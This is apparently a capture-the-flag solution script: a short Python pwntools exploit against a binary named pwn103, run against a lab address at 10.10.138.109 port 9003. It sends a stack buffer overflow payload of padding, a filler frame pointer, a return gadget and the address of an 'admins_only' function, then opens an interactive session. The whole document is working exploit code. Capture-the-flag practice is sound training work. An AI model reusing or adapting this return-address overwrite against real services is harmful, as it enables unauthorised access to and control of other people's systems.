from pwn import *
from sys import stdout


context.binary = binary = ELF('./pwn103-1644300337872.pwn103')

pad = b'A'*32
rbp = b'C'*8
admin_only = p64(binary.symbols.admins_only)
ret_address = p64(0x401377)
stdout.buffer.write(pad+rbp+admin_only)

#p = process('./pwn103-1644300337872.pwn103')
p = remote('10.10.138.109', 9003)
#p.recvuntil(b'Choose the channel: ')
p.sendline(b'3')
#p.recvuntil(b'------[pwner]: ')
p.sendline(pad+rbp+ret_address+admin_only)


p.interactive()
